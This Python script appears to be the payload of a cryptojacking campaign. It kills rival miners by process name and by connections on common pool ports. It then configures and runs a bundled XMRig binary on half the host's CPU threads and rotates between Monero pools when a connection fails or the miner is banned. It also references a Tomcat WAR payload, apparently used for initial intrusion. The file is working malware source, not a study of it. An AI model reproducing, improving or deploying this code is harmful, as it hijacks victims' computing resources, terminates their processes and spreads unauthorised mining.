import sys
import os
import subprocess
import re
import signal
import shutil
import threading
# make  CURRENT DIR / libs the first directory python will look for imports
script_path=os.path.dirname(__file__)
sys.path.insert(0, os.path.join(script_path, 'libs'))
import requests

# netstat -utnp | grep -E '3333|4444|5555|14444|xmr'
class custom_Regex:
      def get_pid_psfaux(process):
          pattern = r"\s(\d+)\b"
          pid_match = re.search(pattern, process)
          if pid_match:
             pid_str = pid_match.group().strip()
             if pid_str.isdigit():
                return int(pid_str)
             else:
                return 0
          else:
             return 0

      def get_ports_netstat(connection):
          pattern = r":(\d+)\b"
          ports_match = re.findall(pattern, connection) # FIND ALL MATCHES
          if ports_match:
            return [int(port) for port in ports_match]
          else:
            return 0
     
      def get_pid_netstat(connection):
          pattern = r"\b(\d+)/[a-zA-Z]*"
          pid_match = re.search(pattern, connection) # FIND FIRST MATCH ONLY
          if pid_match:
             pid_str = pid_match.group(1).strip()
             if pid_str.isdigit():
               return int(pid_str)
             else:
               return 0
          else:
             return 0


class Payloads:
      tomcat_war_file  = os.path.join(script_path, 'payloads', 'tomcat', 'cute.war')

class Miner:
      def kill_unknown_miner(self):
          # GET CURRENT PROCESSES RUNNING
          try:
            psfaux_output = subprocess.run(["ps", "auxf"], capture_output=True, text=True, check=True)
          except:
            return 0

          for process in psfaux_output.stdout.splitlines():
              if process.find("xmrig") != -1 or process.find("xmr") != -1 or process.find("miner") != -1:
                 pid = custom_Regex.get_pid_psfaux(process)
                 if pid == 0:
                    continue
                 # KILL PROCESS
                 try:
                   os.kill(pid, signal.SIGKILL)
                 except:
                   continue
          # GET ALL TCP/UDP CONNECTIONS
          try:
            netstat_output = subprocess.run(["netstat", "-utpn"], capture_output=True, text=True, check=True)
          except:
            return 0

          for connection in netstat_output.stdout.splitlines():
               ports = custom_Regex.get_ports_netstat(connection)
               if ports == 0:
                  continue
               # CHECK ADVERSARY POOL CONNECTION PORT
               for port in ports:
                 if port == 3333 or port == 4444 or port == 5555 or port == 14444:
                    # GET PID AND KILL PROCESSES ON SUSPICIOUS PORTS
                    pid = custom_Regex.get_pid_netstat(connection)
                    if pid == 0:
                       continue
                    try:
                       os.kill(pid, signal.SIGKILL)
                    except:
                       continue

      def get_cpu_threads(self):
          try:
            output = subprocess.check_output(['nproc'], text=True).strip()
            if output.isdigit():
               return int(output)
            else:
               return 0
          except:
            return 0

      def update_threads_config(self, available_threads):
          try:
            with open(os.path.join(script_path, "xmrig", "config.json"), "r+") as configFile:
                 # READS WHOLE FILE IN MEMORY
                 data = configFile.read()
                 substr = "max-threads-hint"
                 start_pos = data.find(substr)
                 if start_pos != -1:
                    current_threads = data[start_pos+len(substr)+3:start_pos+len(substr)+3+2]
                    if current_threads.isdigit():
                       new_data = data[:start_pos+len(substr)+3] + str(available_threads) + data[start_pos+len(substr)+5:]
                    elif current_threads[0].isdigit():
                       new_data = data[:start_pos+len(substr)+3] + str(available_threads) + data[start_pos+len(substr)+4:]
                    else:
                       return 0

                    if len(new_data) > 2500:
                       configFile.seek(0)
                       configFile.truncate(0) # CLEAR PREVIOUS DATA
                       configFile.write(new_data)
          except:
            return 0

      def update_pool_config(self):
          try:
            with open(os.path.join(script_path, "xmrig", "config.json"), "r+") as configFile:
                 data = configFile.read()
                 substr = "\"url\""
                 start_pos = data.find(substr)
                 pools = ["gulf.moneroocean.stream:10128", "pool.supportxmr.com:3333"]
                 new_data = "NULL"
                 if start_pos != -1:
                    for pool in pools:
                        current_pool = data[start_pos+len(substr)+3:start_pos+len(substr)+3+len(pool)]
                        if current_pool == pools[0]:
                           new_data = data[:start_pos+len(substr)+3] + pools[1] + data[start_pos+len(substr)+3+len(pool):]
                        elif current_pool == pools[1]:
                           new_data = data[:start_pos+len(substr)+3] + pools[0] + data[start_pos+len(substr)+3+len(pool):]

                        if new_data != "NULL" and len(new_data) > 2500:
                           configFile.seek(0)
                           configFile.truncate(0)
                           configFile.write(new_data)
                           break
          except:
            return 0

      def miner_Handler(self):
          while True:
           try:
            miner_process = subprocess.Popen(
            [os.path.join(script_path, "xmrig", "xmrig")],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,  # combine stderr with stdout
            bufsize=1,  # line-buffered
            text=True
            )
           except:
             continue

           for lines in miner_process.stdout:
                lines = lines.lower()
                print(lines)
                if lines.find("unknown node or service") != -1 or lines.find("can't connect to") != -1 or lines.find("connection lost") != -1 or lines.find("banned") != -1:
                   os.kill(miner_process.pid, signal.SIGINT)
                   try:
                     miner_process.wait(15) # GIVE IT 15 SECONDS TO SHUT DOWN OR RAISE EXCEPTION
                     self.update_pool_config()
                     break
                   except:
                     os.kill(miner_process, signal.SIGKILL)
                     self.update_pool_config()
                     break

if __name__ == '__main__':
   miner_obj = Miner()

   if shutil.which("netstat") != None and shutil.which("ps") != None:
      miner_obj.kill_unknown_miner()

   if shutil.which("nproc") != None:
      available_threads = miner_obj.get_cpu_threads()
   else:
      available_threads = 0

   if available_threads == 0: # IN CASE OF ERROR RETRIEVING CPU THREADS, DEFAULT TO 2
      available_threads = 2
   else:
      available_threads = int(available_threads / 2)

   miner_obj.update_threads_config(available_threads)

   miner_worker_thread = threading.Thread(target=miner_obj.miner_Handler)
   miner_worker_thread.start()
   
   print("SUCCESS")
   print("SUCCESS")
